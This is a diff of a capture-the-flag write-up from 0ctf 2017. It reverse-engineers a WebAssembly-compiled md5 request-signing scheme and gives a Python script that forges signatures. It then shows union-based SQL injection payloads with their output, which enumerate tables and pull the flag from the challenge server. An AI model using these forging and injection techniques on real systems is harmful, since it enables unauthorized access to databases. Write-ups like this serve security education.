@@ -190,5 +190,67 @@ function __Z3hi1NSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE($
  STACKTOP = sp;return;
 }
 ```
-By looking both at the source of HASH1 and at it's return value we can tell it's `md5`. 
+By looking both at the source of `HASH1` and at it's return value we can tell it's `md5`.
+![screenshot of md5 displayed in chrome dev tools](https://github.com/asterite3/writeups/raw/master/0ctf-2017/scr1.png)
 
+It then takes a substring of the result, calling
+```c++
+std::string::string($2, 6, 16); // = "d727d11f6d284a0d"
+```
+After that the program concatenates it with our input, one space, string `"This_is_salt"` and a timestamp:
+```c++
+"d727d11f6d284a0d" + id + " " + "This_is_salt" + timestamp
+```
+So, for `http://202.120.7.213:11181/?id=2` we get something like `"d727d11f6d284a0d2 This_is_salt1490273086"`.
+All this is fed again to `hi1()`, which takes md5.
+Finally, timestamp and a string `"yo"` is added to the resulting hash, with pipe (`"|"`) as a separator. So in this case we get `"29b2bcd9b1a5ed0bfd12885896c7c69b|1490273086|yo"`.
+This is it - signature algorighm! Cool! Now we can sign strings ourselves:
+```python
+from hashlib import md5
+from requests import get
+
+def sign(s, timestamp):
+    return md5("d727d11f6d284a0d" + s + " " + "This_is_salt" + timestamp).hexdigest()
+
+def get_url(payload):
+    url = "http://202.120.7.213:11181/api.php?id=%s&hash=%s&time=%s"
+    timestamp = "orange" # timestamp is not really validated
+    return url % (payload, sign(payload, timestamp), timestamp)
+
+def test(payload):
+    url = get_url(payload)
+    print url
+    r = get(url)
+    print r.status_code
+    print get(url).content
+```
+
+## Server side
+
+Let's try our first idea, SQLi:
+```
+>>> test('4')
+http://202.120.7.213:11181/api.php?id=4&hash=35306a53e5a1d2560b935e64df97c203&time=orange
+200
+Hansome Chen
+>>> test('3 or 1=1 --')
+http://202.120.7.213:11181/api.php?id=3 or 1=1 --&hash=00a54c146b53df7664024b5b26972e9d&time=orange
+200
+EaseSingle QinShort 5altMarried MaHansome ChenPresident Liu
+>>> test('3 or 1=0 --')
+http://202.120.7.213:11181/api.php?id=3 or 1=0 --&hash=92473f8187ccd04be5eb172c012f5861&time=orange
+200
+Married Ma
+>>> test('3 and 1=0 union select 0, table_name from information_schema.tables --')
+http://202.120.7.213:11181/api.php?id=3 and 1=0 union select 0, table_name from information_schema.tables --&hash=ae1a0f59c9a7bf48db0df30d97977479&time=orange
+200
+CHARACTER_SETSCOLLATIONSCOLLATION_CHARACTER_SET_APPLICABILITYCOLUMNSCOLUMN_PRIVILEGESENGINESEVENTSFILESGLOBAL_STATUSGLOBAL_VARIABLESKEY_COLUMN_USAGEPARAMETERSPARTITIONSPLUGINSPROCESSLISTPROFILINGREFERENTIAL_CONSTRAINTSROUTINESSCHEMATASCHEMA_PRIVILEGESSESSION_STATUSSESSION_VARIABLESSTATISTICSTABLESTABLESPACESTABLE_CONSTRAINTSTABLE_PRIVILEGESTRIGGERSUSER_PRIVILEGESVIEWSINNODB_BUFFER_PAGEINNODB_TRXINNODB_BUFFER_POOL_STATSINNODB_LOCK_WAITSINNODB_CMPMEMINNODB_CMPINNODB_LOCKSINNODB_CMPMEM_RESETINNODB_CMP_RESETINNODB_BUFFER_PAGE_LRUfl4guser
+>>> test('3 and 1=0 union select 0, column_name from information_schema.columns where table_name = "fl4g" --')
+http://202.120.7.213:11181/api.php?id=3 and 1=0 union select 0, column_name from information_schema.columns where table_name = "fl4g" --&hash=9b048d7488adc72b0de39d9df12f9573&time=orange
+200
+hey
+>>> test('3 and 1=0 union select 0, hey from fl4g --')
+http://202.120.7.213:11181/api.php?id=3 and 1=0 union select 0, hey from fl4g --&hash=35bef9fe3b309e3fbe1b66642b8744f8&time=orange
+200
+flag{emScripten_is_Cut3_right?}
+```
